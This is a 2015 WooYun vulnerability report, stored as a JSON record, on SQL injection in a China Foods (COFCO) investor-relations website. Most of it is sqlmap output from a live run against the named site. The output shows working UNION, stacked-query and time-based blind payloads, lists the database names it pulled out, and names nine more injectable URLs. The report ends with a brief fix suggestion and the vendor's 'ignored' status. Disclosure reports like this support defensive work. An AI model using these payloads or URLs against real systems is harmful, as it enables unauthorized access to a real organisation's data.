{"id": 40286, "wybug_id": "wooyun-2015-091973", "wybug_title": "中粮集团某分站多处sql注入漏洞", "wybug_corp": "中粮集团有限公司", "wybug_author": "#6c6c6c", "wybug_date": "2015-01-15 12:59", "wybug_open_date": "2015-01-20 13:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-01-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-01-20：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql 详细说明：  \n注入地址:http://www.chinafoodsltd.com:8080/IR_E/notice.jsp?ClassID=2015    sqlmap/1.0-dev - automatic SQL injection and database takeover tool    http://www.sqlmap.org[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 04:26:00[04:26:00] [INFO] using 'F:\\桌面\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.chinafoodsltd.com\\session' as session file[04:26:00] [INFO] testing connection to the target url[04:26:00] [INFO] testing if the url is stable, wait a few seconds[04:26:02] [INFO] url is stable[04:26:02] [INFO] testing if GET parameter 'ClassID' is dynamic[04:26:02] [INFO] confirming that GET parameter 'ClassID' is dynamic[04:26:02] [INFO] GET parameter 'ClassID' is dynamic[04:26:02] [WARNING] heuristic test shows that GET parameter 'ClassID' might not be injectable[04:26:02] [INFO] testing sql injection on GET parameter 'ClassID'[04:26:02] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'[04:26:04] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'[04:26:05] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'[04:26:06] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'[04:26:07] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'[04:26:07] [INFO] testing 'MySQL > 5.0.11 stacked queries'[04:26:08] [INFO] testing 'PostgreSQL > 8.1 stacked queries'[04:26:09] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'[04:26:20] [INFO] GET parameter 'ClassID' is 'Microsoft SQL Server/Sybase stacked queries' injectable[04:26:20] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'[04:26:20] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'[04:26:20] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'[04:26:31] [INFO] GET parameter 'ClassID' is 'Microsoft SQL Server/Sybase time-based blind' injectable[04:26:31] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'[04:26:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'[04:26:33] [INFO] ORDER BY technique seems to be usable. This should reduce thetime needed to find the right number of query columns. Automatically extending the range for UNION query injection technique[04:26:35] [INFO] target url appears to have 16 columns in query[04:26:37] [INFO] GET parameter 'ClassID' is 'Generic UNION query (NULL) - 1 to10 columns' injectableGET parameter 'ClassID' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection points with a total of 69 HTTP(s) requests:---Place: GETParameter: ClassID    Type: UNION query    Title: Generic UNION query (NULL) - 16 columns    Payload: ClassID=2015') UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, CHAR(58)+CHAR(112)+CHAR(115)+CHAR(105)+CHAR(58)+CHAR(88)+CHAR(106)+CHAR(102)+CHAR(115)+CHAR(116)+CHAR(99)+CHAR(109)+CHAR(75)+CHAR(104)+CHAR(79)+CHAR(58)+CHAR(111)+CHAR(113)+CHAR(113)+CHAR(58), NULL--  AND ('JkBq'='JkBq    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: ClassID=2015'); WAITFOR DELAY '0:0:5';-- AND ('ZfvF'='ZfvF    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: ClassID=2015') WAITFOR DELAY '0:0:5'-- AND ('KTJj'='KTJj---[04:27:23] [INFO] testing MySQL[04:27:23] [WARNING] the back-end DBMS is not MySQL[04:27:23] [INFO] testing Oracle[04:27:23] [WARNING] the back-end DBMS is not Oracle[04:27:23] [INFO] testing PostgreSQL[04:27:24] [WARNING] the back-end DBMS is not PostgreSQL[04:27:24] [INFO] testing Microsoft SQL Server[04:27:24] [INFO] confirming Microsoft SQL Server[04:27:26] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2005[04:27:26] [INFO] fetching database namesavailable databases [5]:[*] IR[*] master[*] model[*] msdb[*] tempdb[04:27:27] [INFO] Fetched data logged to text files under 'F:\\桌面\\渗透工具\\sqlmap GUI汉化版\\rar\\output\\www.chinafoodsltd.com'[*] shutting down at 04:27:27\n\nhttp://www.chinafoodsltd.com:8080/IR_E/activity.jsp?ClassID=2015 存在sql注入漏洞http://www.chinafoodsltd.com:8080/IR_E/notice.jsp?ClassID=2015 存在sql注入漏洞http://www.chinafoodsltd.com:8080/IR_E/activityDetail.jsp?ID=23 存在sql注入漏洞http://www.chinafoodsltd.com:8080/IR_E/noticeDetail.jsp?ID=344 存在sql注入漏洞http://www.chinafoodsltd.com:8080/IR_F/activity.jsp?ClassID=2012 存在sql注入漏洞http://www.chinafoodsltd.com:8080/IR/activity.jsp?ClassID=2014 存在sql注入漏洞http://www.chinafoodsltd.com:8080/IR_E/fisummary.jsp?ClassID=3 存在sql注入漏洞http://www.chinafoodsltd.com:8080/IR_F/notice.jsp?ClassID=2015 存在sql注入漏洞http://www.chinafoodsltd.com:8080/IR_F/activityDetail.jsp?ID=29 存在sql注入漏洞还有很多，你们慢慢排查吧。\n   漏洞证明：     修复方案：  过滤下就ok了。尽可能搞个d盾或者安全狗什么的。至少我这种脚本小子注入不了。   版权声明：转载请注明来源 #6c6c6c@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-01-20 13:00 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}